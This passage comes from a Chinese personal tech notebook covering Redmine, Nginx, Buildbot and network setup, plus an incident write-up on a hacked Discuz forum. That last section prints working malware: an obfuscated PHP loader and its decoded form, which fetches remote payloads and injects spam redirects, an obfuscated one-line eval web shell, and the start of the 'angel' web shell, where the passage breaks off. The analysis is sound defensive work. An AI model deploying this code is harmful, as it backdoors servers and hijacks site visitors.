     #+begin_src sh
       mysql -uroot -p
     #+end_src

   - 创建 =redmine= 用户及库

     #+begin_src sql
       CREATE DATABASE redmine CHARACTER SET utf8;
       CREATE USER 'redmine'@'localhost' IDENTIFIED BY 'redmine';
       GRANT ALL PRIVILEGES ON redmine.* TO 'redmine'@'localhost';
     #+end_src
   
   - 修改数据库配置文件

     #+begin_src sh
       cp config/database.yml.example config/database.yml
       diff config/database.yml config/database.yml.example
       10,11c10,11
       <   username: redmine
       <   password: "redmine"
       ---
       >   username: root
       >   password: ""
     #+end_src
   
   - 初始化会话存储
     
     #+begin_src sh
       rake generate_secret_token
     #+end_src
     
   - 创建数据库表结构
   
     #+begin_src sh
       RAILS_ENV=production rake db:migrate
     #+end_src

   - 解决上一步可能出现的错误

     #+BEGIN_QUOTE
       rake aborted!
       Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
       
       Tasks: TOP => db:migrate => environment
     #+END_QUOTE
     
     确定 =mysql= 启动时指定的 =mysql.sock= 文件的路径

     #+begin_src sh
       ps aux | grep mysql.sock
     #+end_src

     显示的 =mysql.sock= 路径可能为“ =--socket=/tmp/mysql.sock= ”

     修改 =redmine= 数据库配置，在 =production= 配置中添加 =socket= 项：

     #+begin_example
       production:
         ...
         socket: /tmp/mysql.sock
     #+end_example

     重新进行上一步操作。
      
   - 初始化数据

     #+begin_src sh
       RAILS_ENV=production REDMINE_LANG=zh rake redmine:load_default_data
     #+end_src

   - 创建相关目录

     #+begin_src sh
       mkdir -p tmp tmp/pdf public/plugin_assets
       sudo chown -R nobody:nobody files log tmp public/plugin_assets
       sudo chmod -R 755 files log tmp public/plugin_assets
     #+end_src

** 试运行 =redmine=

   #+begin_src sh
     ruby script/rails server webrick -e production
   #+end_src

   - 浏览器打开页面
     
     [[http://localhost:3000]]

     使用 用户名 =admin= ，密码 =admin= 登录后，立即修改密码。
 
     使用下面的命令生成随机的密码：
     
     #+begin_src sh
       cat /dev/urandom | head -1 | md5sum | head -c 8
     #+end_src

** 配置 =redmine=

   - 修改 =config/settings.yml=
     
** 使用 =Nginx= 和 =passenger=

   #+begin_src sh
     wget 'http://nginx.org/download/nginx-1.4.6.tar.gz'
     tar xzvf nginx-1.4.6.tar.gz
     gem install passenger
     yum install pcre-devel
     passenger-install-nginx-module
   #+end_src

   - 交互式安装过程

     + Automatically download and install Nginx?
       
       选 2. No: I want to customize my Nginx installation. (for advanced users)
 
     + Where is your Nginx source code located?
       
       填解压的 =nginx= 源码包路径
 
     + Where do you want to install Nginx to?
 
       填 =/usr/local/nginx=
 
   - 修改 /usr/local/nginx/conf/nginx.conf
 
       在最后的 =}= 前添加以下配置
 
       #+begin_example
         include vhosts/*.conf;
       #+end_example
       
   - 添加站点配置文件 =/usr/local/nginx/conf/vhosts/redmine.conf=
 
       #+begin_example
         server {
           listen  80;
           server_name <域名>;
           root <redmine根目录>/public;
           passenger_enabled on;
           client_max_body_size 10m; # Max attachemnt size
         }
       #+end_example

   - 启动 =nginx=
     
     #+begin_src sh       
       /usr/local/nginx/sbin/nginx
     #+end_src

   - 现在可以正式访问站点了

     http://<域名>

** 支持 =OpenID= 第三方帐号登录

   - 安装 =openid= 库

     #+begin_src sh
       gem install ruby-openid
     #+end_src

   - 使用 =admin= 帐号登录系统，在“管理 - 配置 - 认证”中勾选上“允许使用OpenID登录和注册”。 

   - 用户注册时“密码”可以省略， 填上 =OpenID URL= 即可。

   - 如何获得Google的OpenID URL？
     
     + 先在 =Google= 的站点上登录
     + 打开 [[https://profiles.google.com]] 后会跳转到类似这样（ =https://plus.google.com/000000000000000000000/posts= ）的网页
     + 你的 =OpenID URL= 为 http://profiles.google.com/000000000000000000000
 
     上面的 =000000000000000000000= 可能为任意的数字串
   
   - 管理员确认注册后即可在登录界面上输入 =OpenID URL= 直接登录
     
     一般浏览器的输入框是有记忆功能的，双击后会出现输入历史下拉列表，直接选择即可。

   - 安装插件简化 =OpenID= 登录
     
     + [[https://github.com/jorgebg/redmine-openid-selector]] （不推荐） 为原始分枝，在 =redmine-2.5.0= 下不能直接安装会导致站点登录界面出现404错误，解决方案在 [[http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778][这里]] ，简而言之就是把插件目录名中的 =-= 改为 =_= 。
       
     + [[https://github.com/computerminds/redmine_openid_selector]] （不推荐） 这个分枝安装后可用，但界面为英文（其实界面就一句英文）。
     
     + https://github.com/tangxinfa/redmine_openid_selector （推荐） 为支持中文我fork了上一个分枝。
   
     + 通用的插件安装过程：

       #+begin_src sh
         cd plugins
         git clone https://github.com/tangxinfa/redmine_openid_selector.git
         rake redmine:plugins:migrate RAILS_ENV=production
         touch tmp/restart.txt
       #+end_src

     + 通用的插件卸载过程：
     
       #+begin_src sh
         rake redmine:plugins:migrate NAME=redmine-openid-selector VERSION=0 RAILS_ENV=production
         rm -rf plugins/redmine-openid-selector
         touch tmp/restart.txt
       #+end_src      
    
     现在在登录及注册页面直接点击第三方站点Logo即可。

** 样式美化

   #+begin_src sh
     git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-cookers
     touch tmp/restart.txt
   #+end_src

   现在可以使用 =admin= 登录后台，在“管理 - 配置 - 显示 - 主题”中启用主题 =Pixel-cookers= 。

* TODO Archlinux下安装Buildbot                              :python:Buildbot:
  
** 安装Buildbot

   参照 [[http://docs.buildbot.net/current/tutorial/firstrun.html][官方文档]] 进行安装：

   - 安装基础软件

     #+begin_src sh
       sudo easy_install-2.7 virtualenv
       virtualenv-2.7 --no-site-packages sandbox
       source sandbox/bin/activate
       easy_install sqlalchemy==0.7.10
       easy_install buildbot
     #+end_src
  
   - 安装运行Master

     #+begin_src sh
       buildbot create-master master
       mv master/master.cfg.sample master/master.cfg
       buildbot start master
       tail -f master/twistd.log &
     #+end_src
     
   - 安装运行Slave

     #+begin_src sh
       easy_install buildbot-slave
       buildslave create-slave slave localhost:9989 example-slave pass
       buildslave start slave
       tail -f slave/twistd.log &
     #+end_src

   - 打开界面

     [[http://localhost:8010/]]

* DONE Archlinux网络接口上出现两个IP                      :archlinux:network:
  CLOSED: [2014-03-12 Wed 11:32]

  - 发现两个IP

    我的电脑是直接连到公司的墙上的网口上网的，在测试路由器的时候，我把路由器的WAN口接墙上的网口，然后电脑连到路由器的LAN口上，上网正常。查看分配到的IP为192.168.111.2，路由器的IP为192.168.111.1， 想到我一直用 =192.168.90.73= 这个IP，有些配置也依赖这个IP，所以还想分到这个IP，所以把路由器的DHCP做了设置，路由器IP改为192.168.90.74，分配的IP范围为192.168.90.71-192.168.90.73，再次重连电脑分配的IP为192.168.90.71，然后发现上不了网了，浏览器上输入路由器的IP（192.168.90.74）竟然打开了我机器（192.168.90.71）上建的WEB服务，其他人连这个网络却可以通过192.168.90.74这个IP正常打开路由器界面，最终通过“ip address show”这个命令发现我的网口上有两个IP（192.168.90.71、192.168.90.74）， =ipconfig= 和其它GUI工具只能看到第一个IP。

  - 第二个IP是怎么来的？

    抓包分析了一下DHCP网络包，只给分配了192.168.90.71这个IP，看来192.168.90.74这个IP是我机器上配置的，于是搜索/etc、/var下的文件，最后在/var/log/journal/*/system.journal中找到了日志：

    #+begin_example
      NetworkManager[375]: <debug> [1394509845.924245] [nm-system.c:280] sync_addresses(): (eno1): adding address '192.168.90.74/24'
    #+end_example

    然后在NetworkManager的配置文件 =/etc/NetworkManager/system-connections/Profile 1= 中找到了相关配置：
   
    #+begin_example
      [ipv4]
      method=auto
      address1=192.168.90.74/24,192.168.90.2
    #+end_example

    删除掉 =address1= 后，再重连网络，就只有一个IP了。

    这应该是 =NetworkManager= 的一个 [[https://bugs.archlinux.org/task/41395][BUG]] ，当手动设置IP后切回DHCP自动获取IP方式时不清除手动设置的时会出现。

* TODO 在Arm板开发最简单的程序                                    :linux:arm:

  - 查看Arm板型号
  
    #+begin_example
      # uname -m
      armv7l
    #+end_example

  - 我的工作环境

    #+begin_example
      $ uname -a
      Linux tangxinfa-archlinux 3.13.6-1-ARCH #1 SMP PREEMPT Fri Mar 7 22:47:48 CET 2014 x86_64 GNU/Linux
    #+end_example

  - 编译低版本的 =texinfo=

    #+begin_src sh
      wget http://ftp.gnu.org/gnu/texinfo/texinfo-4.13a.tar.gz
      tar -zxvf texinfo-4.13a.tar.gz
      cd texinfo-4.13
      ./configure
      make
      cd ..
    #+end_src

  - 下载低版本的 =texlive=

    #+begin_src sh
      wget ftp://tug.org/historic/systems/texlive/2009/texlive-20091107-bin.tar.xz
      tar xJvf texlive-20091107-bin.tar.xz
    #+end_src
  
  - 下载Gcc-Arm-Embedded并编译好

    #+begin_src sh
      export PATH=`pwd`/texinfo-4.13/makeinfo:`pwd`/texlive-20091107-bin/x86_64-linux:$PATH
      wget 'https://launchpad.net/gcc-arm-embedded/4.8/4.8-2013-q4-major/+download/gcc-arm-none-eabi-4_8-2013q4-20131204-src.tar.bz2'
      tar xjvf gcc-arm-none-eabi-4_8-2013q4-20131204-src.tar.bz2
      cd gcc-arm-none-eabi-4_8-2013q4-20131204/src
      find -name "*.tar.*" | xargs -I% tar -xf %
      cd zlib-1.2.5/
      patch -p1 <../zlib-1.2.5.patch 
      cd ../../
      ./build-prerequisites.sh --skip_mingw32
      ./build-toolchain.sh --skip_mingw32
    #+end_src

    以上过程参考《gcc-arm-none-eabi-4_8-2013q4-20131204/How-to-build-toolchain.pdf》

* TODO linux下遭遇进程状态“D”                                       :linux:

  - 进程状态“D”介绍

    + 解释1 :: uninterruptible sleep (usually IO)。不可中断的睡眠（通常是因为IO）。
    
    + 解释2 :: Disk Sleep。磁盘睡眠。
    
    通常由进程阻塞式的发起了IO操作（read、write）

* DONE 论坛被挂暗链问题分析与解决                       :discuz:security:web:
  CLOSED: [2014-04-01 Tue 21:38]

** 发现问题
   
   有网友反映我们的论坛被挂了暗链，具体表现为从 =google= 搜索论坛名称结果如下图所示：

   [[file:../static/site_attacked.png]]
   
   直接搜索论坛网址出现的一些热门帖子也被挂了暗链，通过 =google= 搜索结果访问会跳到恶意网站，

** 解决问题

   直接通过网址访问论坛则没有任务问题，应该是论坛被注入了恶意代码，一时没被发现。

   - 在代码和数据库dump结果中搜索恶意站点信息，一无所获

   - 然后怀疑是用户上传的图片中挂了马，特别是联想到首页最近刚上热图轮播，安装 =firefox= 插件 =ImageBlock= 让浏览器不加载图片，可是问题依旧
     
   - 打开 =firebug= 的 =Network= 标签，在页面加载记录中发现一个异常的js加载： =http://api.discuz.com.de/Seo.js= 
     
     在代码和数据库中搜索这个js找不到任何信息。

     + 将恶意站点配置一条 =hosts= 

       #+begin_example
           127.0.0.1 api.discuz.com.de
       #+end_example

     浏览器不再自动跳转到恶意网站了。 

   - 从 =google= 跳转到论坛后，查看页面源代码在最开始部分发现了引入恶意js的语句

     #+begin_src html
       <div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>
     #+end_src

   - 在php脚本中加入 =echo= 语句逐步缩小范围，最终发现问题由下面一条语句引起

     #+begin_src php
       INCLUDE(pack('H*','2f7661722f746d702f2e53595344554d502f2e576830416d492e434f5245'));
     #+end_src

     上面的语句引入了 =/var/tmp/.SYSDUMP/.Wh0AmI.CORE= 脚本。

     删除该语句后问题解决。

** 分析恶意代码

   - =/var/tmp/.SYSDUMP/.Wh0AmI.CORE=

    #+begin_src php
      <?php $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0idVJKalF2d2xZRHBIS29Vc2tBZG1pQlphTkdxeEZoQ1hUZ09MY1Z0RVd5Yk1Jcm56UGVTZklUak95VnFVZmdDZWx1SndkQldzUXpTbnRLeExrUEVtRnBYTWJhaFJ2SGlBR1lyY05vWkROZzlxbmVCdEVROHhneXV4Zm1hMG5LOUhYcld1aTJraG55MGxsUUJwSmFScEdndTBYZ2RIQWdKM2d5dXhNcTBsU21qSGkzakRic2FxaTNqMG52NXJsZ0JDWHEwbGpLU0NpS2FSbm1HcE5aQnJNM1NQYlE5MGltQlZNVXRTSjBUYUZhQlZqY3d0RVFUakpnMGRtMXRrSlVTa0pVd3JKZGF0RjFUa20wa1JUa0dybUZ3dEVRVEVpM3k5ams5RlRhanZUYWppajBQSmFrekRhYXRrSlU5elQwYVhhRVdXWHEwbGpralVTTzBkbTF0a0pVU2tKVXdyWmtUSkprOVpUSlNrSmRhWmoxMDdneXVkWjBVeU52a0hic2s1bEViTEFGYklBT3BJQU9KMU1PQTNqSHFyQUZSMk1PSjFNT0cwQVo0SHRFYndqY1JIdFo0MnRFNDV0RTRIQUZkck1FYkxBRmRJQUZ5M01PUkx0RTRIQUZBck1FYkxBRnBJQUZHSE1PUjRYRTRMWEZ5ck1FYjJBRTRMdGNHSUFPRzVNT2ZMakhxcnRPUklBRnA0TU9BNU1PUjJqSHFydE9SSUFGeTNNT2Q0TU9SNVhFYndqY2ZMTU9SSFhaNDB0WjQzQVFid2pjUkxBSDQ1WEU0SHRGeUlBT3kxakhxcnRGcElBT0dMTU9mTE1PUkhYRWJ3amNSTHRINGN0RTQzQUg0M0FFYndqY0o0TU9HTHRaNExYRkJJWGd5ck1FYkxBRmJJQU9wSUFPSjFNT0pjakhxckFGcGNNT2RMTU95cU1PUjB0RWJ3amNSTHRINEhBWjRIQU9CSUFPeTFqSHFyQUZHSE1PR0hYRTRIQWdCSXRnZnJNRWIyQVo0THRPeUlBRkpxTU9icWpIcXJ0T1JJQUZ5M01PUnFYRTQwQVpid2pjUkx0UTQxdFo0SHRnR0lBRkE0akhxckFGUjBNT3BxTU9HSEFRNEh0Z0dyTUViMkFaNEx0Z2JJQUZCNE1PeUxqSHFyQUZSMk1PRzF0WjRIQWNCSXRjQnJNRWJIQU9HSUFGcDJNT0cwTU9HMmpIcXJBT0dITU9SNHRRNEh0RTQxWFpid2pjR0hBRTRMWGdSSUFGSjRNT1JxdFFid2pjUkhBSDRMQU9KSUFGZnFNT0dMdFpiQ1hxMGxqUmhFaTN5OWZtakhmbWR1ajBqUG52VDFiM3pDU0thSGpIcXJUMjlWUzJMVWZzOTBqSHFydnZrdWkyOHJNRVdFbnY1cmZzOTBqSHFySjI5Y2kzdHFudlRVYlFid2oxdFZTMjkxakhxckFjZnFKM3pDU0thSGpIcXJ2djkxU0trVnlzOTBqSGQ3Z3l1ZFoyYTVOdmtIYnNrNWxFV1BpcmsxZnY0SWkzanJqSHFyUzI5VlMyTFVNc3RWaVpid2ozdFZiMjhJZjI5aGpIcXJqdko0anZHMWpGUE9qSHFyanZKNWp2a1Bqdkdxakhxcmp2SjVqdkdManZqT2pIcXJqdkozakZwNWpGVVFqSHFyanZKMWpGUGRqRlVQanZKMWp2amRqdlI1akhxcmp2SjNqRmQ1anZqVWp2SjFqdmtVanZHMmpIcXJqdkoyanZSY2pGUFFqdkozakZwNWpGUE9qSHFyanZKMmp2RzRqdkc0anZKMmpGcDRqRlBzakhxcmp2SjFqdlI0anZHTGp2SjBqdkc1akZkcWpIcXJqdkoxakZVUWp2amRqdko1akZkNWpGcDFqSHFyanZKM2pGVU9qRlVzanZKMGp2alBqdmpQakhxcmp2SjNqRlVPakZVc2p2SjVqRmRIanZHTGpIcXJqdkozakZQVWp2R3Fqdko1akZwM2pGZExqSHFyanZKMmp2R2NqdlI0anZKMWpGcDJqRlBPakhxcmp2SjFqdmpPakZwcWp2SjJqRnA0anZHM2pIcXJqdkoxanZqZGp2UjVqdko1akZwM2pGZExqSHFyanZKNGp2RzFqRlVQanZKNWpGZEhqdkdMakhxcmp2SjJqRlBzakZkcWp2SjNqRlBVanZHcWpIcXJqdkozanZrZGpGZDJqdkozakZkMWp2UjFqSHFyanZKNGp2a3NqRmQxanZKM2pGUFVqdlI1akhxcmp2SjFqdkc1anZHY2p2SjFqRlBzanZHcWpIcXJqdkoxanZSMGp2a1Bqdko1akZkNGp2R2NqdkoxakZVc2pGUFVqSHFyanZKMGp2amRqRmRjanZKNWp2a1BqRlBPanZKNWpGcDNqRmRMakhkN2d5Q3NXdjVPV0tVVmlRemRTdkFxU0tKdWpLU0NpS2FSbm1Hd2pLVFBXS1JDb3EwbGpLVFBXS2t6YnJHcE5aelVvZXp3aTJUVWxFYjZqSHFkU0trMGZaZDdneXVqalJoVW9tQXBOWnpVb2V6d2kyVFVsRWI2akhMUWZtdFV0T1REU0thT2kyVFVsZXQwYlU5SGkzeUxBSFBxZnZ0WWxFV0dsUWJ3aktUUFdLa3picmppQWswQ2xaZENYcTBsRVpUWFNtV2NHZzBwU21QcWlLOWRTWnByWFFid2Zza2NTRmYwbTJUVWYyOWRTWlBjV2VqRGJzOTBBRkF1YktrT25IcHJaRXVyTUVUZGZtVFB5bWpIdmNrV2xaZENsRnd0RXBkZEZLVUluM0E5R0thNGJLTFZTS0p1amN1ck1LalBiMkoydGs5ZFN2dFZTS0p1YjNUSG0zalZXZ1JjbGV6UGYyd3VqMHB4akhxZFNLazBmSmtIYlV3SG1aZENsWmQ3Z3l1anlLVUlmMkwxU0tKdWpLU0NpS2FSbm1HSWpINW1uZ3p6aUpkSUZKOVJUSnFybEZoZG52SjdneUM5Z3lDc1d2NU9XS1VWaVF6clNtVGRmbVRQbEVUZGZtVFBtM2FIaUVVN2d5Q0NTUUJ1U3JhSWYzVENpMjVEU21QQ2IzVGNsRVdPV21qd20yYTRTdkFybFpkcG9xMGxqZXRxbTJ0MWJzcXBOWnpCZjNhSGlrOUNpc1UwbEVkN2d5Q09XbWp3bTN0VVdLOXFXRXBkYjN6RGYzYUhpRXFweTFhWkZSOXlhazlhSmRxd0dFVGRmbVRQbTNhSGlFZDdneUNPV21qd20zdFVXSzlxV0VwZGIzekRmM2FIaUVxcHkxYVpGUjl5YWs5R1RKa1JUYUd3R2dCQ1hxMGxmM2FIaWs5Y1NtVFZiZXl1amV0cW0ydDFic3F3R1J0YUpkTE5Ka1REeTA5WEZkYWdha1RqRkphTmFheXdHZ0pDWHEwbGYzYUhpazljU21UVmJleXVqZXRxbTJ0MWJzcXdHUnRhSmRMTkprVERKZGFKYWFqWGFranpGVXRLVGFHd0dnUkNYcTBsakt0VmlyVFVpclRjR2cwcHlLdDFic0xEU21QVWZIcGRiM3pEZjNhSGlFZDdneUNCZjNhSGlrOU9pSzljU1pwZGIzekRmM2FIaUVkN2d5QzlTdkxjU3ZVc2xLUzFpc3QwbnY5SW0yYTRubXQwYkhwcmIzVEhTdmtobTJ0VmlyVFVvZVREZjNqVWZtVFVqSGRDR2V3dEVRVGNiazlPaTI1MEdnMHBmbWpIZm1kdWoyUDBXZUJyR2cwK0dLa0hic2s1bEVXaFNtVHVpMnlyR2cwK0dFV2VUYXlyTUVXMG52MVVpM2EwakhCOU5RQjFsWmQ3Z3l1ZGIzekRiM1RIU1pCOUdSemNXZWpVZnYxRGYyOUlXS2E0V2s5T2JzYVBXS0p1amV0cW0ydFZpcnlDWHEwbGpLdFZpclRVaXJUY0dnMHB5S1NDaUthRFMyYTBtMnRWaXJUVWlyVGNsRVRkZm1UUG0zYUhpRXFwU3Nrd2IySndHRVRjYms5Y1dlalVsRnd0RXIxVWlldFVvcTBsaktQUGlzVHdTWkI5R1J6c2kzelVpUXBkU0trMGZhOTFic3F3R0VqSGZRR0NYSEJ0RVFUT2kyNTBTdjUwYkhCOUdSemNXZWpVZnYxRFMyYTBtMnRWaXJUVWlyVGNsRVR1ZnY1ZGlLSkNYSEJ0RWR6c2YyTFZiMkp1aktQUGlzVHdTWmQ3Z3lDOWd5Q0hTbVQxYnM0cGpLdFZpclRVaXJUY1hxMGxEeTBsU3JhSWYzVENpMjRwYjJQVldIcGRTc1V3U0pUQ2JRVTdneXVkU3NVd1N2NVBpdko5aktTQ2lLYVJubUdJaXZ5MWxFVERKMGFaYWRhWnZIV0dha1R5bTBQTkoxeXJtWjRkbTF0a0pVU2tKVXdySmRhVGFKYUZhazlhSmRkcm1aZDdneUNDU1FQQ2IxOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>
    #+end_src
    
   - 参考 [[http://blog.i1728.com/post/99.html][网上方法]] 解码的结果

    #+begin_src php
      <?php
      /*
      ,*author:whoami
      ,*  QQ  :4892057
      ,*/
      error_reporting(0);
      $fileDir = '/var/tmp/.SYSDUMP/';
      $IP=$_SERVER['REMOTE_ADDR'];
      $Bot=$_SERVER['HTTP_USER_AGENT'];
      $Ref=$_SERVER['HTTP_REFERER'];
      $KIP=array('117.28.255.37','116.55.241.24','125.64.94.219','119.147.114.213','118.122.188.194','60.172.229.61','61.188.39.16','61.147.98.198','61.129.45.72','113.98.254.245','58.221.61.128','117.34.73.70','58.215.190.84','117.28.255.53','183.91.40.144','117.21.220.245','122.228.200.46','61.164.150.70','61.147.108.41','116.55.242.138','114.80.222.242','61.147.108.41','116.255.230.70','222.186.24.26','222.186.24.59','220.181.158.106','123.125.160.215');
      $KBot=array('Baiduspider','Googlebot','Yahoo','Bingbot','Sosospider','Sogou','360Spider','YoudaoBot');
      $Key=array('anquan.org','google.com','soso.com','%e8%b5%8c','%e9%aa%b0','%e9%b1%bc','%e7%89%9b','%e5%8d%9a%e5%bd%a9','%e7%99%be%e5%ae%b6','%e6%a3%8b%e7%89%8c','%e6%b8%b8%e6%88%8f','%e5%a8%b1%e4%b9%90','%e5%9b%bd%e9%99%85','%e7%9c%9f%e4%ba%ba','%e7%9c%9f%e9%92%b1','%e7%8e%b0%e9%87%91','%e6%b3%a8%e5%86%8c','%e5%bc%80%e6%88%b7','%e5%bd%a9%e9%87%91','%e8%b5%9a%e9%92%b1','%e6%8f%90%e7%8e%b0','%e7%ad%96%e7%95%a5','%e8%af%95%e7%8e%a9','%e5%b9%b3%e5%8f%b0','%e5%a4%aa%e9%98%b3%e5%9f%8e','%e4%bd%93%e9%aa%8c%e9%87%91');
      function dec0de($fileDir,$data){
      $dataArr = explode(':',$data);
          $Keys = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[0]))));
          $News = explode(':',base64_decode(str_rot13(pack('H*',$dataArr[1]))));
          $Links= explode(':',base64_decode(str_rot13(pack('H*',$dataArr[2]))));
          @include($fileDir.'.Wh0AmI.MODEL');die;
      }
      function getdata($data_url){
      if (function_exists('curl_exec')) {
      $sp_curl = @curl_init();
      curl_setopt($sp_curl, CURLOPT_URL, $data_url);
      curl_setopt($sp_curl, CURLOPT_HEADER, 0);
      curl_setopt($sp_curl, CURLOPT_CONNECTTIMEOUT, 5);
      curl_setopt($sp_curl, CURLOPT_RETURNTRANSFER, 1);
      $contents = @curl_exec($sp_curl);
      @curl_close($sp_curl);
      }elseif(function_exists('stream_context_create')) {
      $sp_cont = array('http' => array('method' => 'GET','timeout' => 5));
      $sp_stre = @stream_context_create($sp_cont);
      $contents = @file_get_contents($data_url, false, $sp_stre);
      }else{
      $handle = @fopen($data_url, "rb"); 
      $contents = @stream_get_contents($handle); 
      @fclose($handle);
      }
      return $contents;
      }
      function show($fileDir){
      $filename=$fileDir.md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
      if(is_file($filename)){
          $fp=@fopen($filename,'r');
          $data=@fread($fp,filesize($filename));
          @fclose($fp);
          if(empty($data)) {@unlink($filename);return;}
          dec0de($fileDir,$data);
      } else {
          $data=getdata('http://bet.discuz.com.de/w0shiOo7.php?HOST='.$_SERVER['HTTP_HOST']);
          $fp=@fopen($filename,'w');
          @fwrite($fp,$data);
          @fclose($fp);
          if(strlen($data) > 1000) {
          dec0de($fileDir,$data);
          }
      }}
      if(!in_array($IP,$KIP)){
      foreach($KBot as $KBots){if(stristr($Bot,$KBots)){
      show($fileDir);
      }}foreach($Key as $Keys){
      if(stristr($Ref,$Keys)){
      echo "<div style='display:none'><script language='javascript' src='http://count31.51yes.com/click.aspx?id=310940343&logo=1' charset='gb2312'></script></div><script type='text/javascript' src='http://api.discuz.com.de/Seo.js'></script>";}}}      
    #+end_src
     
   上面代码的目的就是下载恶意代码并执行。  

** 继续排查

   通过比较svn中的代码与现网的代码还发现了一个新的后门程序

   - =uc_client/control/class.php=

     #+begin_src php
       <?php $mt="mFsKCleRfU"; $ojj="IEBleldle"; $hsa="E9TVFsnd2VuJ10p"; $fnx="Ow=="; $zk = str_replace("d","","sdtdrd_redpdldadcde"); $ef = $zk("z", "", "zbazsze64_zdzeczodze"); $dva = $zk("p","","pcprpepaptpe_fpupnpcptpipopn"); $zvm = $dva('', $ef($zk("le", "", $ojj.$mt.$hsa.$fnx))); $zvm(); ?>
     #+end_src

     解码后的结果

     #+begin_src php
       @eval($_POST['wen']);
     #+end_src
   
     上面的脚本可以注入任意的代码。

   - =./uc_server/data/tmp/angel.php=

     #+begin_src web
       <?php
       error_reporting(7);
       @set_magic_quotes_runtime(0);
       ob_start();
       $mtime = explode(' ', microtime());
       $starttime = $mtime[1] + $mtime[0];
       define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
       define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
       define('IS_COM', class_exists('COM') ? 1 : 0 );
       define('IS_GPC', get_magic_quotes_gpc());
       $dis_func = get_cfg_var('disable_functions');
       define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
       @set_time_limit(0);@preg_replace("/[email]/e",$_POST['Id'],"error");
       
       foreach($_POST as $key => $value) {
           if (IS_GPC) {
               $value = s_array($value);
           }
           $$key = $value;
       }
       /*===================== 程序配置 =====================*/
       
       //echo encode_pass('angel');exit;
       //angel = ec38fe2a8497e0a8d6d349b3533038cb
       // 如果需要密码验证,请修改登陆密码,留空为不需要验证
       $pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel
       
       //如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
       // cookie 前缀
       $cookiepre = '';
       // cookie 作用域
       $cookiedomain = '';
       // cookie 作用路径
       $cookiepath = '/';
       // cookie 有效期
       $cookielife = 86400;
       
       //程序搜索可写文件的类型
       !$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
